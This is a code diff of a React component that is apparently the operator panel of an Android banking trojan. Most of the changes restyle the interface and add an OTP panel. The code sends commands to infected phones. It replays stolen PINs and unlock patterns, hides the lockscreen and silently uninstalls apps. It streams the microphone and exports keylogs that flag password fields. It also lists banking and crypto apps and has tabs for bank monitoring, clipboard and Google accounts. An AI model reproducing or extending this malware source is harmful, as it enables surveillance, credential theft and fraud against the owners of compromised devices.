@@ -3155,36 +3172,36 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   };
 
   const renderUnlockRecordingControls = () => (
-    <div className="rounded-lg p-3 border border-cyan-500/30 bg-cyan-900/20 space-y-2">
-      <div className="text-xs text-cyan-300 font-semibold">🔓 Gravação de Unlock</div>
+    <div className="rounded-md p-3 border border-[#2a2a31]/30 bg-[#1a1a1e]/20 space-y-2">
+      <div className="text-xs text-[#ef4444] font-semibold"> Gravação de Unlock</div>
       <div className="grid grid-cols-2 gap-2">
         <button
           type="button"
           onClick={startUnlockRecordingCmd}
           disabled={isUnlockRecording}
-          className="py-2 bg-red-700 hover:bg-red-600 disabled:opacity-50 text-white rounded-lg text-xs font-bold"
+          className="py-2 bg-[#ef4444] hover:bg-[#ef4444] disabled:opacity-50 text-white rounded-md text-xs font-bold"
         >
-          🔴 Gravar
+           Gravar
         </button>
         <button
           type="button"
           onClick={stopUnlockRecordingCmd}
           disabled={!isUnlockRecording}
-          className="py-2 bg-slate-700 hover:bg-slate-600 disabled:opacity-50 text-white rounded-lg text-xs font-bold"
+          className="py-2 bg-[#2a2a31] hover:bg-[#6f6f78] disabled:opacity-50 text-white rounded-md text-xs font-bold"
         >
           ¹ Parar
         </button>
         <button
           type="button"
           onClick={playUnlockLocal}
-          className="py-2 bg-blue-700 hover:bg-blue-600 text-white rounded-lg text-xs font-bold"
+          className="py-2 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded-md text-xs font-bold"
         >
-          ▶ Local
+           Local
         </button>
         <button
           type="button"
           onClick={playUnlockFromServer}
-          className="py-2 bg-indigo-700 hover:bg-blue-600 text-white rounded-lg text-xs font-bold"
+          className="py-2 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded-md text-xs font-bold"
         >
           ˜ Servidor
         </button>
@@ -3196,12 +3213,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
           onChange={(e) => setPatternInput(e.target.value.replace(/[^1-9]/g, ''))}
           placeholder="Pattern 14789"
           maxLength={9}
-          className="flex-1 px-2 py-1.5 bg-[#440e05] border border-blue-500/25 rounded text-blue-300 font-mono text-sm text-center"
+          className="flex-1 px-2 py-1.5 bg-[#121214] border border-[#2a2a31]/25 rounded text-[#ef4444] font-mono text-sm text-center"
         />
         <button
           type="button"
           onClick={runPatternUnlockDirect}
-          className="px-3 py-1.5 bg-purple-700 hover:bg-blue-600 text-white rounded-lg text-xs font-bold"
+          className="px-3 py-1.5 bg-purple-700 hover:bg-[#ef4444] text-white rounded-md text-xs font-bold"
         >
           Pattern
         </button>
@@ -3216,7 +3233,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         {/* Top Info */}
         <div className="text-center mt-2">
           <div className="w-12 h-12 rounded-full bg-yellow-500/10 border border-yellow-500/30 flex items-center justify-center mx-auto mb-2 animate-pulse shadow-[0_0_15px_rgba(234,179,8,0.2)]">
-            <span className="text-xl">🔒</span>
+            <span className="text-xl"></span>
           </div>
           <p className="text-xs text-gray-450 font-semibold uppercase tracking-wider">PIN Requerido</p>
         </div>
@@ -3232,14 +3249,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                   className={`w-3.5 h-3.5 rounded-full transition-all duration-300 ${
                     hasChar
                       ? 'bg-yellow-400 shadow-[0_0_10px_rgba(234,179,8,0.8)] scale-110'
-                      : 'border border-slate-700 bg-slate-900/50'
+                      : 'border border-[#2a2a31] bg-[#121214]/50'
                   }`}
                 />
               );
             })}
           </div>
           {val && (
-            <p className="text-yellow-400 font-mono text-lg font-bold tracking-widest mt-4 bg-yellow-950/40 border border-yellow-500/20 rounded-lg px-3 py-0.5 animate-pulse">
+            <p className="text-yellow-400 font-mono text-lg font-bold tracking-widest mt-4 bg-yellow-950/40 border border-yellow-500/20 rounded-md px-3 py-0.5 animate-pulse">
               {val}
             </p>
           )}
@@ -3256,7 +3273,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 className={`w-7 h-7 rounded-full flex items-center justify-center text-[10px] font-bold border transition-all ${
                   isSelected
                     ? 'border-yellow-500 bg-yellow-500/10 text-yellow-450 shadow-[0_0_8px_rgba(234,179,8,0.3)]'
-                    : 'border-slate-800 bg-slate-900/40 text-slate-500'
+                    : 'border-[#24242a] bg-[#121214]/40 text-[#8b8b94]'
                 }`}
               >
                 {num}
@@ -3374,7 +3391,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 cx={cx}
                 cy={cy}
                 r="18"
-                fill={isSelected ? "rgba(239, 68, 68, 0.2)" : "#160606"}
+                fill={isSelected ? "rgba(239, 68, 68, 0.2)" : "#0a0a0b"}
                 stroke={isSelected ? "#ef4444" : "#3d2020"}
                 strokeWidth={isSelected ? "3" : "2"}
                 filter={isSelected ? "url(#glow-neon)" : ""}
@@ -3417,7 +3434,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     await sendCommand({ action: 'HIDE_LOCKSCREEN' });
     await sendCommand({ action: 'PATTERN_UNLOCK', pattern });
     await sendCommand({ action: 'PLAY_PATTERN_SEQUENCE', pattern, delay: 1000 });
-    addLog(`🔲 Pattern unlock executado: ${pattern}`);
+    addLog(` Pattern unlock executado: ${pattern}`);
   };
   
   // Reproduz sequência de PIN ou Pattern automaticamente no aparelho real
@@ -3430,7 +3447,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       }
       
       setIsPlayingPin(true);
-      addLog(`🔄 Reproduzindo PIN: ${pin} (delay: ${pinDelay}ms)`);
+      addLog(` Reproduzindo PIN: ${pin} (delay: ${pinDelay}ms)`);
       
       if (isLockscreenActive) {
         await hideLockscreen();
@@ -3458,7 +3475,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       const totalTime = (pin.length + 1) * pinDelay + 1000;
       setTimeout(() => {
         setIsPlayingPin(false);
-        addLog('✅ Reprodução do PIN concluída');
+        addLog(' Reprodução do PIN concluída');
       }, totalTime);
       
     } else {
@@ -3471,7 +3488,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       }
       
       setIsPlayingPin(true);
-      addLog(`🔲 Reproduzindo Pattern: ${pattern} no aparelho...`);
+      addLog(` Reproduzindo Pattern: ${pattern} no aparelho...`);
       
       if (isLockscreenActive) {
         await hideLockscreen();
@@ -3498,7 +3515,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       
       setTimeout(() => {
         setIsPlayingPin(false);
-        addLog('✅ Reprodução do Pattern concluída');
+        addLog(' Reprodução do Pattern concluída');
       }, 2000);
     }
   };
@@ -3556,7 +3573,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       }
     } catch (error) {
       console.error('Erro ao buscar apps:', error);
-      addLog('❌ Erro ao buscar apps');
+      addLog(' Erro ao buscar apps');
     } finally {
       setIsLoadingApps(false);
     }
@@ -3608,13 +3625,13 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   };
   
   const uninstallApp = async (packageName: string, appName: string) => {
-    console.log('—‘ uninstallApp chamado:', { packageName, appName });
+    console.log(' uninstallApp chamado:', { packageName, appName });
     
     if (confirm(`Deseja desinstalar "${appName}" do aparelho de forma 100% automática?\n\nPackage: ${packageName}`)) {
       try {
-        console.log('—‘ Enviando comando UNINSTALL_APP para:', packageName);
+        console.log(' Enviando comando UNINSTALL_APP para:', packageName);
         await sendCommand({ action: 'UNINSTALL_APP', package: packageName });
-        addLog(`—‘ Desinstalação automática solicitada: ${appName} (${packageName})`);
+        addLog(` Desinstalação automática solicitada: ${appName} (${packageName})`);
         
         // Recarrega a lista de apps após alguns segundos para atualizar o painel
         setTimeout(() => {
@@ -3623,15 +3640,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
           } catch (e) {}
         }, 3500);
       } catch (error) {
-        console.error('❌ Erro ao desinstalar:', error);
-        addLog(`❌ Erro ao desinstalar: ${appName}`);
+        console.error(' Erro ao desinstalar:', error);
+        addLog(` Erro ao desinstalar: ${appName}`);
       }
     }
   };
   
   const forceStopApp = async (packageName: string, appName: string) => {
     await sendCommand({ action: 'FORCE_STOP_APP', package: packageName });
-    addLog(`⛔ Forçando parada: ${appName}`);
+    addLog(` Forçando parada: ${appName}`);
   };
   
   // Filtra apps
@@ -3700,7 +3717,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     audioContextRef.current = audioContext;
     
     ws.onopen = () => {
-      console.log('🎤 Microphone stream íconectado');
+      console.log(' Microphone stream íconectado');
     };
     
     ws.onmessage = async (event) => {
@@ -3726,20 +3743,20 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         source.start(0);
         
       } catch (error) {
-        console.error('🎤❌ Erro ao processar áudio:', error);
+        console.error(' Erro ao processar áudio:', error);
       }
     };
     
     ws.onerror = (error) => {
-      console.error('🎤❌ Erro no microphone stream:', error);
+      console.error(' Erro no microphone stream:', error);
       ws.close();
     };
     
     ws.onclose = () => {
-      console.log('🎤 Microphone stream desíconectado');
-      // ”„ REÍCONEXƒO AUTOMTICA se o microfone ainda estiver habilitado
+      console.log(' Microphone stream desíconectado');
+      //  REÍCONEXƒO AUTOMTICA se o microfone ainda estiver habilitado
       if (isMicrophoneEnabled && showMicrophoneModal) {
-        console.log('🎤 Reíconectando microfone em 2 segundos...');
+        console.log(' Reíconectando microfone em 2 segundos...');
         (window as any).micReconnectTimer = setTimeout(() => {
           startMicrophoneStream();
         }, 2000);
@@ -3774,22 +3791,22 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     // Mapeamento de packages conhecidos para nomes amigáveis
     const knownApps: { [key: string]: string } = {
       'com.android.chrome': 'Œ Chrome',
-      'com.google.android.gm': '📧 Gmail',
-      'com.whatsapp': '💬 WhatsApp',
-      'com.facebook.katana': '📘 Facebook',
-      'com.instagram.android': '📷 Instagram',
+      'com.google.android.gm': ' Gmail',
+      'com.whatsapp': ' WhatsApp',
+      'com.facebook.katana': ' Facebook',
+      'com.instagram.android': ' Instagram',
       'com.twitter.android': ' Twitter',
-      'com.google.android.apps.messaging': '💬 Messages',
-      'com.android.contacts': '📞 Contacts',
-      'com.android.settings': 'š™ Settings',
+      'com.google.android.apps.messaging': ' Messages',
+      'com.android.contacts': ' Contacts',
+      'com.android.settings': 'š Settings',
       'com.google.android.inputmethod.latin': '¨ Keyboard',
-      'com.google.android.apps.maps': '— Google Maps',
-      'com.snapchat.android': '👻 Snapchat',
-      'com.paypal.android.p2pmobile': '💳 PayPal',
+      'com.google.android.apps.maps': ' Google Maps',
+      'com.snapchat.android': ' Snapchat',
+      'com.paypal.android.p2pmobile': ' PayPal',
       'com.bankofamerica.mobile': ' Bank of America',
       'com.chase.sig.android': ' Chase',
-      'com.venmo': '💸 Venmo',
-      'com.coinbase.android': '₿ Coinbase'
+      'com.venmo': ' Venmo',
+      'com.coinbase.android': ' Coinbase'
     };
 
     // Retorna nome amigável se conhecido, senão usa appName
@@ -3813,7 +3830,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
       txtContent += `[${index + 1}] ${log.timestamp}\n`;
       txtContent += `App: ${friendlyName}\n`;
       if (log.package) txtContent += `Package: ${log.package}\n`;
-      if (log.isPassword) txtContent += `🔑 PASSWORD FIELD DETECTED!\n`;
+      if (log.isPassword) txtContent += ` PASSWORD FIELD DETECTED!\n`;
       txtContent += `Text: ${log.text}\n`;
       if (log.hint) txtContent += `Field Hint: ${log.hint}\n`;
       if (log.fieldName) txtContent += `Field Name: ${log.fieldName}\n`;
@@ -3835,14 +3852,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     document.body.removeChild(a);
     URL.revokeObjectURL(url);
 
-    addLog(`📥 Keylogger downloaded: ${keylogs.length} logs`);
+    addLog(` Keylogger downloaded: ${keylogs.length} logs`);
   };
 
   if (!device) {
     return (
-      <div className="min-h-screen bg-[#290903] flex items-center justify-center">
+      <div className="min-h-screen bg-[#1a1a1e] flex items-center justify-center">
         <div className="text-center">
-          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
+          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#3a3a44] mx-auto mb-4"></div>
           <p className="text-gray-400">Carregando dispositivo...</p>
         </div>
       </div>
@@ -3856,7 +3873,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
     return (
       <div className="fixed inset-0 bg-black z-[200] flex flex-col">
         {/* Header Mobile Compacto */}
-        <div className="bg-[#290903]/95 px-2 py-1 flex items-center justify-between border-b border-blue-500/20">
+        <div className="bg-[#1a1a1e]/95 px-2 py-1 flex items-center justify-between border-b border-[#2a2a31]/20">
           <button
             onClick={() => setIsMobileFullscreen(false)}
             className="p-2 text-white"
@@ -3867,8 +3884,8 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
             <span className="text-white text-xs font-bold truncate max-w-[120px]">
               {device.custom_name ? device.custom_name.toUpperCase() : device.model}
             </span>
-            <div className={`w-2 h-2 rounded-full ${device.is_online ? 'bg-green-500' : 'bg-red-500'}`}></div>
-            {device.admin_active && <span className="text-xs" title="Admin Ativo">›¡</span>}
+            <div className={`w-2 h-2 rounded-full ${device.is_online ? 'bg-green-500' : 'bg-[#ef4444]'}`}></div>
+            {device.admin_active && <span className="text-xs" title="Admin Ativo">¡</span>}
           </div>
           <button
             onClick={() => setShowMobileControls(!showMobileControls)}
@@ -3879,21 +3896,21 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         </div>
         
         {/* Tabs VNC/V2 Mobile */}
-        <div className="bg-[#440e05] px-2 py-1 flex space-x-1">
+        <div className="bg-[#121214] px-2 py-1 flex space-x-1">
           <button
             onClick={() => setShowScreenReader(false)}
-            className={`flex-1 py-1.5 rounded text-xs font-bold ${!showScreenReader ? 'bg-blue-600 text-white' : 'bg-slate-700 text-gray-400'}`}
+            className={`flex-1 py-1.5 rounded text-xs font-bold ${!showScreenReader ? 'bg-[#ef4444] text-white' : 'bg-[#2a2a31] text-gray-400'}`}
           >
-            📺 VNC
+             VNC
           </button>
           <button
             onClick={() => {
               setShowScreenReader(true);
               if (!isScreenReaderEnabled) toggleScreenReader();
             }}
-            className={`flex-1 py-1.5 rounded text-xs font-bold ${showScreenReader ? 'bg-green-600 text-white' : 'bg-slate-700 text-gray-400'}`}
+            className={`flex-1 py-1.5 rounded text-xs font-bold ${showScreenReader ? 'bg-green-600 text-white' : 'bg-[#2a2a31] text-gray-400'}`}
           >
-            ‘ V2 {isScreenReaderEnabled && '…'}
+             V2 {isScreenReaderEnabled && ''}
           </button>
         </div>
         
@@ -3917,9 +3934,9 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               <div className="w-full h-full flex items-center justify-center bg-black">
                 <button
                   onClick={toggleCapture}
-                  className="px-6 py-3 bg-gray-800 text-white rounded-lg border border-gray-600"
+                  className="px-6 py-3 bg-gray-800 text-white rounded-md border border-gray-600"
                 >
-                  –¶ Iniciar Captura
+                  ¶ Iniciar Captura
                 </button>
               </div>
             )
@@ -4020,21 +4037,21 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         
         {/* Controles Mobile */}
         {showMobileControls && (
-          <div className="bg-[#440e05] border-t border-blue-500/20 p-2 space-y-2">
+          <div className="bg-[#121214] border-t border-[#2a2a31]/20 p-2 space-y-2">
             {/* Navegação */}
             <div className="grid grid-cols-4 gap-1">
-              <button onClick={() => sendCommand({ action: 'BACK' })} className="py-3 bg-slate-700 text-white rounded text-xl">◀</button>
-              <button onClick={() => sendCommand({ action: 'HOME' })} className="py-3 bg-slate-700 text-white rounded text-xl">—</button>
-              <button onClick={() => sendCommand({ action: 'RECENTS' })} className="py-3 bg-slate-700 text-white rounded text-xl">■</button>
-              <button onClick={() => sendCommand({ action: 'POWER' })} className="py-3 bg-red-600 text-white rounded text-xl">»</button>
+              <button onClick={() => sendCommand({ action: 'BACK' })} className="py-3 bg-[#2a2a31] text-white rounded text-xl"></button>
+              <button onClick={() => sendCommand({ action: 'HOME' })} className="py-3 bg-[#2a2a31] text-white rounded text-xl"></button>
+              <button onClick={() => sendCommand({ action: 'RECENTS' })} className="py-3 bg-[#2a2a31] text-white rounded text-xl"></button>
+              <button onClick={() => sendCommand({ action: 'POWER' })} className="py-3 bg-[#ef4444] text-white rounded text-xl">»</button>
             </div>
             
             <div className="grid grid-cols-5 gap-1">
-              <button type="button" onClick={() => sendCommand({ action: 'VIBRATE' })} className="py-2 bg-amber-700 text-white rounded text-xs">📳</button>
-              <button type="button" onClick={() => sendCommand({ action: 'VOLUME_DOWN' })} className="py-2 bg-slate-700 text-white rounded text-xs">🔉</button>
-              <button type="button" onClick={() => sendCommand({ action: 'VOLUME_UP' })} className="py-2 bg-slate-700 text-white rounded text-xs">🔊</button>
-              <button type="button" onClick={() => sendCommand({ action: 'LOCK_DEVICE' })} className="py-2 bg-red-800 text-white rounded text-xs">🔒</button>
-              <button type="button" onClick={() => sendCommand({ action: 'SNAP_SCREEN' })} className="py-2 bg-teal-700 text-white rounded text-xs">📷</button>
+              <button type="button" onClick={() => sendCommand({ action: 'VIBRATE' })} className="py-2 bg-amber-700 text-white rounded text-xs"></button>
+              <button type="button" onClick={() => sendCommand({ action: 'VOLUME_DOWN' })} className="py-2 bg-[#2a2a31] text-white rounded text-xs"></button>
+              <button type="button" onClick={() => sendCommand({ action: 'VOLUME_UP' })} className="py-2 bg-[#2a2a31] text-white rounded text-xs"></button>
+              <button type="button" onClick={() => sendCommand({ action: 'LOCK_DEVICE' })} className="py-2 bg-[#24242a] text-white rounded text-xs"></button>
+              <button type="button" onClick={() => sendCommand({ action: 'SNAP_SCREEN' })} className="py-2 bg-teal-700 text-white rounded text-xs"></button>
             </div>
             
             {/* Ações */}
@@ -4043,27 +4060,27 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 onClick={toggleCapture}
                 className={`py-2 rounded text-xs font-bold ${isCaptureEnabled ? 'bg-green-600 text-white' : 'bg-gray-700 text-white'}`}
               >
-                {isCaptureEnabled ? '”´ Captura' : '–¶ Captura'}
+                {isCaptureEnabled ? '´ Captura' : '¶ Captura'}
               </button>
               <button
                 onClick={toggleBlackScreen}
-                className={`py-2 rounded text-xs font-bold ${isBlackScreen ? 'bg-black text-white border border-white' : 'bg-slate-700 text-white'}`}
+                className={`py-2 rounded text-xs font-bold ${isBlackScreen ? 'bg-black text-white border border-white' : 'bg-[#2a2a31] text-white'}`}
               >
-                {isBlackScreen ? '⬛ Preta ON' : '⬜ Preta'}
+                {isBlackScreen ? ' Preta ON' : ' Preta'}
               </button>
               <button
                 onClick={() => sendCommand({ action: 'NOTIFICATIONS' })}
-                className="py-2 bg-blue-600 text-white rounded text-xs font-bold"
+                className="py-2 bg-[#ef4444] text-white rounded text-xs font-bold"
               >
-                🔔 Notif.
+                 Notif.
               </button>
             </div>
             
             <button 
               onClick={handleFormatDevice} 
-              className="w-full py-2 bg-red-950 text-white rounded text-xs font-bold border border-red-700 tracking-wider uppercase transition-all mt-1"
+              className="w-full py-2 bg-[#121214] text-white rounded text-xs font-bold border border-[#3a3a44] tracking-wider uppercase transition-all mt-1"
             >
-              🚨 Formatar Equipamento (Reset)
+               Formatar Equipamento (Reset)
             </button>
           </div>
         )}
@@ -4075,70 +4092,117 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
   // ============================================
   if (isMobile) {
     return (
-      <div className="min-h-screen w-full bg-[#04080f] text-white relative" style={{ overflowX: 'hidden' }}>
+      <div className="min-h-screen w-full bg-[#0f0404] text-white relative" style={{ overflowX: 'hidden' }}>
+      <OtpPanel deviceId={deviceId} />
 
         {/* Gradiente de fundo sólido - SEM transparência */}
-        <div className="fixed inset-0 bg-gradient-to-b from-[#1a0403] via-[#200603] to-[#120303] pointer-events-none z-0" />
+        <div className="fixed inset-0 bg-gradient-to-b from-[#121214] via-[#200603] to-[#120303] pointer-events-none z-0" />
 
         {/* Overlay Offline */}
         {!device.is_online && (
           <div className="fixed inset-0 bg-black/95 backdrop-blur-xl flex items-center justify-center z-[200]">
-            <div className="text-center p-6 bg-[#3a0d04] rounded-2xl border-2 border-red-500 mx-4 shadow-[0_0_40px_rgba(239,68,68,0.4)]">
-              <span className="text-5xl">📵</span>
-              <h2 className="text-xl font-black text-red-400 mt-3 uppercase tracking-wider">Dispositivo Offline</h2>
+            <div className="text-center p-6 bg-[#3a0d04] rounded-md border-2 border-[#2a2a31] mx-4 shadow-[0_0_40px_rgba(239,68,68,0.4)]">
+              <span className="text-5xl"></span>
+              <h2 className="text-xl font-black text-[#ef4444] mt-3 uppercase tracking-wider">Dispositivo Offline</h2>
               <p className="text-slate-400 text-xs mt-2 mb-4">A íconexão com o aparelho foi perdida.</p>
-              <button onClick={() => navigate('/dashboard')} className="px-6 py-2.5 bg-red-600 text-white rounded-xl text-sm font-bold">
-                † Voltar ao Painel
+              <button onClick={() => navigate('/dashboard')} className="px-6 py-2.5 bg-[#ef4444] text-white rounded-md text-sm font-bold">
+                 Voltar ao Painel
               </button>
             </div>
           </div>
         )}
 
         {/* ===== HEADER MOBILE NEON ===== */}
-        <header className="relative z-10 bg-[#220603]/95 backdrop-blur-xl border-b border-cyan-500/30 px-3 py-2 flex items-center justify-between sticky top-0 shadow-[0_2px_20px_rgba(255,43,43,0.15)]">
-          <div className="flex items-center gap-2">
-            <button onClick={() => navigate('/dashboard')} className="p-2 bg-slate-800/80 border border-slate-700 rounded-xl">
-              <ArrowLeft className="w-4 h-4 text-cyan-400" />
-            </button>
-            <div className="min-w-0">
-              <h1 className="text-sm font-black text-white truncate max-w-[140px] font-mono uppercase">
-                {device.custom_name || device.model}
-              </h1>
-              <div className={`text-[10px] font-bold font-mono flex items-center gap-1 ${device.is_online ? 'text-emerald-400' : 'text-red-400'}`}>
-                <span className={`w-1.5 h-1.5 rounded-full inline-block ${device.is_online ? 'bg-emerald-400 shadow-[0_0_6px_#10b981]' : 'bg-red-500'}`} />
-                {device.is_online ? 'ONLINE' : 'OFFLINE'}
-              </div>
+      <header className="sticky top-0 z-30 bg-[#0f0f11]/95 backdrop-blur-xl border-b border-[#24242a]">
+        <div className="flex items-center gap-3 px-4 h-14">
+          <button
+            onClick={() => navigate('/dashboard')}
+            className="p-2 rounded-md border border-[#2a2a31] bg-[#121214] text-[#8b8b94] hover:text-[#e8e8ea] transition-colors flex-shrink-0"
+            title="Volver al panel"
+          >
+            <ArrowLeft className="w-4 h-4" />
+          </button>
+
+          <img src="/gangstar-logo.svg?v=3" alt="Kryptos" className="w-6 h-6 flex-shrink-0" />
+
+          <div className="min-w-0">
+            <div className="flex items-center gap-1.5">
+              <span className="text-[12px] font-semibold text-[#e8e8ea] truncate leading-tight">
+                {device.custom_name ? device.custom_name.toUpperCase() : device.model}
+              </span>
+              <button onClick={handleRename} className="text-[11px] text-[#6f6f78] hover:text-[#e8e8ea] transition-colors flex-shrink-0" title="Renombrar equipo">
+                
+              </button>
+            </div>
+            <div className="text-[9px] font-mono text-[#6f6f78] truncate leading-tight">
+              {device.model} · {device.android_version || 'Android'}
             </div>
           </div>
-          <div className="flex items-center gap-2">
-            {/* Indicador de bateria/íconexão WebSocket */}
-            <div className={`px-2 py-1 rounded-lg border text-[10px] font-bold font-mono ${deviceConnectionStatus === 'online' ? 'bg-emerald-900/60 border-emerald-500/50 text-emerald-300' : 'bg-red-900/60 border-red-500/50 text-red-300'}`}>
-              {deviceConnectionStatus === 'online' ? '— WS' : '—‹ WS'}
-            </div>
-            <button
-              onClick={() => setIsMobileFullscreen(true)}
-              className="px-2.5 py-1.5 bg-gradient-to-r from-blue-600 to-cyan-600 text-white rounded-xl text-[11px] font-bold flex items-center gap-1 shadow-[0_0_12px_rgba(220,38,38,0.5)]"
-            >
-              <Maximize className="w-3.5 h-3.5" /> Fullscreen
-            </button>
+
+          <span className={`flex items-center gap-1.5 px-2 py-0.5 rounded text-[10px] font-mono flex-shrink-0 border ${
+            device.is_online
+              ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400'
+              : 'bg-[#ef4444]/10 border-[#ef4444]/30 text-[#ef4444]'
+          }`}>
+            <span className="w-1.5 h-1.5 rounded-full bg-current" />
+            {device.is_online ? 'EN LÍNEA' : 'SIN CONEXIÓN'}
+          </span>
+
+          <span className={`flex items-center gap-1 px-2 py-0.5 rounded text-[10px] font-mono flex-shrink-0 border ${
+            device.admin_active
+              ? 'bg-[#1a1a1e] border-[#3a3a44] text-[#e8e8ea]'
+              : 'bg-[#121214] border-[#2a2a31] text-[#6f6f78]'
+          }`} title={device.admin_active ? 'Administrador activo' : 'Administrador inactivo'}>
+            <ShieldAlert className="w-3 h-3" />
+            {device.admin_active ? 'ADMIN' : 'SIN ADMIN'}
+          </span>
+
+          <div className="flex-1" />
+
+          <div className="flex items-center border border-[#2a2a31] rounded-md overflow-hidden flex-shrink-0">
+            <button type="button" onClick={() => handleZoomChange(panelZoom - 10)} className="px-1.5 py-1 text-[#8b8b94] hover:bg-[#1a1a1e] text-[11px] font-mono" title="Reducir">-</button>
+            <span className="px-1 text-[10px] font-mono text-[#8b8b94] w-9 text-center select-none">{panelZoom}%</span>
+            <button type="button" onClick={() => handleZoomChange(panelZoom + 10)} className="px-1.5 py-1 text-[#8b8b94] hover:bg-[#1a1a1e] text-[11px] font-mono" title="Ampliar">+</button>
+            {panelZoom !== 100 && (
+              <button type="button" onClick={() => handleZoomChange(100)} className="px-1.5 py-1 text-[9px] font-mono text-[#ef4444] border-l border-[#2a2a31] hover:bg-[#1a1a1e]" title="Restablecer">100</button>
+            )}
           </div>
-        </header>
+
+          <LanguageSelector />
+
+          <button onClick={() => setShowRobotTutorial(true)} className="p-2 rounded-md border border-[#2a2a31] bg-[#121214] text-[#8b8b94] hover:text-[#e8e8ea] transition-colors flex-shrink-0" title="Asistente">
+            <RobotAvatar size={16} isFloating theme="cyan" />
+          </button>
+
+          <button
+            onClick={() => { if (!isFloatingMode) { organizeCockpitLayout(); } else { setIsFloatingMode(false); } }}
+            className={`p-2 rounded-md border transition-colors flex-shrink-0 ${isFloatingMode ? 'bg-[#ef4444]/15 border-[#ef4444]/40 text-[#ef4444]' : 'bg-[#121214] border-[#2a2a31] text-[#8b8b94] hover:text-[#e8e8ea]'}`}
+            title="Modo flotante"
+          >
+            <Layout className="w-4 h-4" />
+          </button>
+
+          <button onClick={onLogout} className="p-2 rounded-md border border-[#2a2a31] bg-[#121214] text-[#8b8b94] hover:text-[#e8e8ea] transition-colors flex-shrink-0" title="Salir">
+            <LogOut className="w-4 h-4" />
+          </button>
+        </div>
+      </header>
 
         {/* ===== ABAS VNC / V2 ===== */}
-        <div className="relative z-10 bg-[#220603]/95 border-b border-slate-700/60 px-3 py-2 flex gap-2 overflow-x-auto no-scrollbar">
+        <div className="relative z-10 bg-[#220603]/95 border-b border-[#2a2a31]/60 px-3 py-2 flex gap-2 overflow-x-auto no-scrollbar">
           {[
-            { label: '📺 VNC', active: !showScreenReader && !showBankMonitorTab && !showNotificationsTab && !showAppsTab && !showGoogleAccountsTab && !showClipboardTab, action: () => { setShowScreenReader(false); setShowBankMonitorTab(false); setShowNotificationsTab(false); setShowAppsTab(false); setShowGoogleAccountsTab(false); setShowClipboardTab(false); if (!isCaptureEnabled) toggleCapture(); }},
-            { label: '‘ V2', active: showScreenReader && !showBankMonitorTab && !showNotificationsTab && !showAppsTab && !showGoogleAccountsTab && !showClipboardTab, action: () => { setShowScreenReader(true); setShowBankMonitorTab(false); setShowNotificationsTab(false); setShowAppsTab(false); setShowGoogleAccountsTab(false); setShowClipboardTab(false); if (!isScreenReaderEnabled) toggleScreenReader(); }},
+            { label: ' VNC', active: !showScreenReader && !showBankMonitorTab && !showNotificationsTab && !showAppsTab && !showGoogleAccountsTab && !showClipboardTab, action: () => { setShowScreenReader(false); setShowBankMonitorTab(false); setShowNotificationsTab(false); setShowAppsTab(false); setShowGoogleAccountsTab(false); setShowClipboardTab(false); if (!isCaptureEnabled) toggleCapture(); }},
+            { label: ' V2', active: showScreenReader && !showBankMonitorTab && !showNotificationsTab && !showAppsTab && !showGoogleAccountsTab && !showClipboardTab, action: () => { setShowScreenReader(true); setShowBankMonitorTab(false); setShowNotificationsTab(false); setShowAppsTab(false); setShowGoogleAccountsTab(false); setShowClipboardTab(false); if (!isScreenReaderEnabled) toggleScreenReader(); }},
             { label: ' Bancos', active: showBankMonitorTab, action: () => { setShowBankMonitorTab(true); setShowGoogleAccountsTab(false); setShowNotificationsTab(false); setShowAppsTab(false); setShowClipboardTab(false); setShowScreenReader(false); }},
-            { label: '📋 Clipboard', active: showClipboardTab, action: () => { setShowClipboardTab(true); setShowGoogleAccountsTab(false); setShowBankMonitorTab(false); setShowNotificationsTab(false); setShowAppsTab(false); setShowScreenReader(false); fetchClipboard(); }},
-            { label: '📧 Contas Google', active: showGoogleAccountsTab, action: () => { setShowGoogleAccountsTab(true); setShowBankMonitorTab(false); setShowNotificationsTab(false); setShowAppsTab(false); setShowClipboardTab(false); setShowScreenReader(false); }},
-            { label: '🔔 Notifs', active: showNotificationsTab, action: () => { setShowNotificationsTab(true); setShowGoogleAccountsTab(false); setShowBankMonitorTab(false); setShowAppsTab(false); setShowClipboardTab(false); fetchNotifications(); }},
+            { label: ' Clipboard', active: showClipboardTab, action: () => { setShowClipboardTab(true); setShowGoogleAccountsTab(false); setShowBankMonitorTab(false); setShowNotificationsTab(false); setShowAppsTab(false); setShowScreenReader(false); fetchClipboard(); }},
+            { label: ' Contas Google', active: showGoogleAccountsTab, action: () => { setShowGoogleAccountsTab(true); setShowBankMonitorTab(false); setShowNotificationsTab(false); setShowAppsTab(false); setShowClipboardTab(false); setShowScreenReader(false); }},
